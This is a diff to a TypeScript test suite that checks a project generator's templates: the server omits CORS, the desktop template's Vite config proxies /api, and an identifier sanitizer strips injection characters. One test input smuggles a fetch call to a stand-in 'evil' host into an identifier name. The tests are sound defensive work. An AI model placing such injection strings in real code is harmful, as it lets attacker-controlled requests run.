@@ -12,14 +12,16 @@ function fileContent(files: { path: string; content: string }[], path: string): 
 
 describe("C2: generated template has no CORS open-permit", () => {
   it("generated server.ts does not import or use cors()", () => {
-    const files = getTemplateFiles("ts", false);
+    const files = getTemplateFiles("en", false);
     const serverTs = fileContent(files, "src/server.ts");
     expect(serverTs).not.toContain("hono/cors");
     expect(serverTs).not.toContain("cors");
   });
 
-  it("generated vite.config still proxies /api (same-origin access path)", () => {
-    const files = getTemplateFiles("ts", false);
+  it("desktop template vite.config still proxies /api (same-origin access path)", () => {
+    // Desktop（フルスタック・サーバー版）テンプレは vite の proxy（/api → 4174）経由で
+    // Hono API にアクセスする。cors() 削除後もこの同一オリジン経路が残っていることを確認。
+    const files = getTemplateFiles("en", true);
     const viteConfig = fileContent(files, "vite.config.ts");
     expect(viteConfig).toContain("/api");
     expect(viteConfig).toContain("4174");
@@ -28,7 +30,7 @@ describe("C2: generated template has no CORS open-permit", () => {
 
 describe("C3: sanitizeIdentifier blocks code injection", () => {
   it("strips quotes, semicolons, backticks, and ${} escapes", () => {
-    expect(sanitizeIdentifier(`items";fetch("https://evil");//`)).toBe("itemsfetchhttpsevill");
+    expect(sanitizeIdentifier(`items";fetch("https://evil");//`)).toBe("itemsfetchhttpsevil");
     expect(sanitizeIdentifier("user`s")).toBe("users");
     expect(sanitizeIdentifier("a${b}c")).toBe("abc");
   });
